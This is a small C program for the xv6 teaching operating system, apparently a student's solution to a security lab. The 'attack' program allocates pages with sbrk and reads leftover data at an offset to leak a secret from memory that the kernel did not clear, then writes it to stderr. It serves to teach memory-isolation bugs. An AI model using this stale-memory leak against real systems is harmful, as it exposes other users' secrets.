#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  if(argc != 1){
    fprintf(2,"Attack Usage: attack \n");
    exit(1);
  }
  char *end = sbrk(PGSIZE * 32);
  end = end + 16 * PGSIZE;
  printf("secret %s\n",end+32);
  write(2,end+32,8);
  exit(0);
}
